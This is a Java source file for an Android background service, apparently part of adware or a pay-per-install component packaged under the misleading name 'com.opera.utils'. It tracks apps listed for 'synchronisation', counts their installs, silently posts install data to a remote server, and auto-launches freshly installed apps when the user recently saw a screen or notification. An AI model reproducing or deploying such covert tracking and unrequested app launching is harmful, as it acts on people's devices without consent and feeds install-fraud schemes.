package com.opera.utils.services;

import java.util.Date;

import com.opera.utils.utils.HttpUtil;
import com.opera.utils.utils.MyHelpUtil;

import android.app.IntentService;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.pm.PackageInfo;

public class PakageService extends IntentService {

	public PakageService(String name) {
		super("BroadcastPakageAddService");
		// TODO Auto-generated constructor stub
	}

	public PakageService() {
		super("BroadcastPakageAddService");
		// TODO Auto-generated constructor stub
	}

	@Override
	protected void onHandleIntent(Intent arg0) {

		if (MyHelpUtil.checkNet(getApplicationContext())) {

			String realpackname = (String) arg0
					.getCharSequenceExtra("realpackname");

			SharedPreferences localSharedPreferences = getApplicationContext()
					.getSharedPreferences("SynchronousApp", 0);

			if (localSharedPreferences.contains(realpackname)) {

				try {

					SharedPreferences appSharedPreferences = getApplicationContext()
							.getSharedPreferences("INSTALL_STATUS", 0);

					Editor localEditor = appSharedPreferences.edit();

					localEditor.putInt(realpackname,
							appSharedPreferences.getInt(realpackname, 0) + 1);

					localEditor.commit();

					int isSystemApp = MyHelpUtil
							.isSystemApp(getApplicationContext());

					if (isSystemApp == 0) {
						/* Sys data */
						synchroInstallDataByBord(realpackname);

					} else {

						MyHelpUtil.sys_msg(getApplicationContext(), 13,
								realpackname);

						if (checkNSOpenTime()) {

							PackageInfo p1 = getPackageManager()
									.getPackageInfo(realpackname, 0);

							if (p1 != null) {

								MyHelpUtil.openApp(p1.packageName,
										getApplicationContext());

								MyHelpUtil.sys_msg(getApplicationContext(), 14,
										realpackname);

							}
						}

					}

				} catch (Exception e) {
					e.printStackTrace();
				}

			}
		}
	}
	
	private boolean checkNSOpenTime() {

		SharedPreferences msgSharedPreferences = getApplicationContext()
				.getSharedPreferences("MSG_STATUS", 0);

		long screen = msgSharedPreferences.getLong("screen", 0);

		long notification = msgSharedPreferences.getLong("notification", 0);

		long res = Math.abs(new Date().getTime()
				- (screen > notification ? screen : notification));

		if (res <= 30 * 60 * 1000) {
			
			return true;
		} else {
			return false;
		}

	}

	
	private void synchroInstallDataByBord(String apppakname) {

		String rawParams = MyHelpUtil.setParams(apppakname, 5,
				getApplicationContext());
		try {
			HttpUtil.postRequest(HttpUtil.BASE_URL + "app_g.action",
					rawParams);
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
}
